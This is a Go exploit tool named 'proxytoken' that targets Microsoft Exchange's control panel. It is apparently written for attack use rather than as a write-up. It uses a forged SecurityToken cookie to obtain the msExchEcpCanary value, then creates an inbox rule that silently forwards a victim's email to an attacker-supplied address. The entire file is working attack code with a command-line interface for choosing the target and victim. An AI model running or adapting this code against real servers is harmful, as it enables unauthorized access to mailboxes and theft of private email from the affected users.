package main

import (
	"crypto/tls"
	"flag"
	"fmt"
	"net/http"
	"strings"
	"time"

	"github.com/fatih/color"
)

func Banner() {
	x := `
	----------------------
	< proxytoken is awesome! >
	  ----------------------
	   \   ^__^
		\  (oo)\_______
		   (__)\       )\/\
			   ||----w |
			   ||     ||`
	y := "By lUc1f3r11"
	color.Red("%s", x)
	color.Yellow("%s", y)
}

func Between(str, starting, ending string) string {
	s := strings.Index(str, starting)
	if s < 0 {
		return ""
	}
	s += len(starting)
	e := strings.Index(str[s:], ending)
	if e < 0 {
		return ""
	}
	return str[s : s+e]
}

func splitmsexch(msexch string) string {
	msexch1 := strings.Split(msexch, "msExchEcpCanary=")
	msexch2 := msexch1[len(msexch1)-1]
	msexch3 := strings.Split(msexch2, ";")
	msexch4 := msexch3[0]

	return msexch4
}

func splitequal(msexch string) string {
	msexch1 := strings.Split(msexch, "=")
	msexch2 := msexch1[0]

	return msexch2
}

func exploit(target, targetemail, victimemail string) {
	user_agent := "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
	/*构造payload*/
	cli := &http.Client{Timeout: time.Second * 7, Transport: &http.Transport{TLSClientConfig: &tls.Config{InsecureSkipVerify: true}}}
	if !strings.Contains(target, "http") {
		target = "http://" + target
	}

	request, err := http.NewRequest(http.MethodGet, target+"/ecp/"+targetemail+"/RulesEditor/InboxRules.svc/Newobject", nil)
	if err != nil {
		fmt.Println(err)
	}

	request.Header.Add("User-Agent", user_agent)
	request.Header.Add("Connection", "close")
	request.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
	request.Header.Add("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
	request.Header.Add("Accept-Encoding", "gzip, deflate")
	request.Header.Add("Cookie", "SecurityToken=x")
	request.Header.Add("Content-Type", "application/json; charset=utf-8")

	do, err := cli.Do(request)
	if err != nil {
		fmt.Println("[-] requesting err...")
		return
	}

	defer func() {
		_ = do.Body.Close()
	}()

	if do.StatusCode == 404 && splitequal(do.Header["Set-Cookie"][0]) == "msExchEcpCanary" {
		fmt.Println("[+] req status: " + do.Status)
		fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + splitmsexch(do.Header["Set-Cookie"][0]))
		fmt.Println("[+] target is vulnerable to proxytoken !")

		postdata := `{"properties":{"RedirectTo":[{"RawIdentity":"` + targetemail + `","DisplayName":"` + targetemail + `","Address":"` + targetemail + `","AddressOrigin":0,"galContactGuid":null,"RecipientFlag":0,"RoutingType":"SMTP","SMTPAddress":"` + targetemail + `"}],"Name":"Testrule","StopProcessingRules":true}}`

		request1, err := http.NewRequest(http.MethodPost, target+"/ecp/"+victimemail+"RulesEditor/InboxRules.svc/Newobject?msExchEcpCanary="+splitmsexch(do.Header["Set-Cookie"][0]), strings.NewReader(postdata))
		if err != nil {
			fmt.Println(err)
		}

		request1.Header.Add("User-Agent", user_agent)
		request1.Header.Add("Connection", "close")
		request1.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8")
		request1.Header.Add("Accept-Language", "zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2")
		request1.Header.Add("Accept-Encoding", "gzip, deflate")
		request1.Header.Add("Cookie", "SecurityToken=x")
		request1.Header.Add("Content-Type", "application/json; charset=utf-8")

		do1, err := cli.Do(request1)
		if err != nil {
			fmt.Println("[-] requesting err...")
			return
		}
		if do1.StatusCode == 200 {
			fmt.Println("[+] req status: " + do1.Status)
			fmt.Println("[+] target Set-Cookie's msExchEcpCanary value is: " + splitmsexch(do.Header["Set-Cookie"][0]))
			fmt.Println("[+] set email redirection rule successed !")
		} else {
			fmt.Println("[-] req status: " + do1.Status)
			fmt.Println("[-] target Set-Cookie value is: " + splitequal(do.Header["Set-Cookie"][0]))
			fmt.Println("[-] set email redirection rule failed !")
		}
	} else {
		fmt.Println("[-] req status: " + do.Status)
		fmt.Println("[-] target Set-Cookie value is: " + splitequal(do.Header["Set-Cookie"][0]))
		fmt.Println("[-] target is not vulnerable to proxytoken !")
	}
}

func main() {
	Banner()
	var target, targetemail, victimemail string
	flag.StringVar(&target, "u", "", "")
	flag.StringVar(&targetemail, "te", "", "")
	flag.StringVar(&victimemail, "ve", "", "")
	flag.CommandLine.Usage = func() {
		fmt.Println("usage：\nexec: ./proxytoken -u <target url> -te <redirect to targetemail> -ve <attack on victimemail>\n")
	}
	flag.Parse()

	if len(target) == 0 {
		fmt.Println("[+] please enter the url you want to check!!!")
		fmt.Println("[+] Author: https://github.com/FDlucifer, https://twitter.com/fdlucifer11")
	}

	exploit(target, targetemail, victimemail)
}
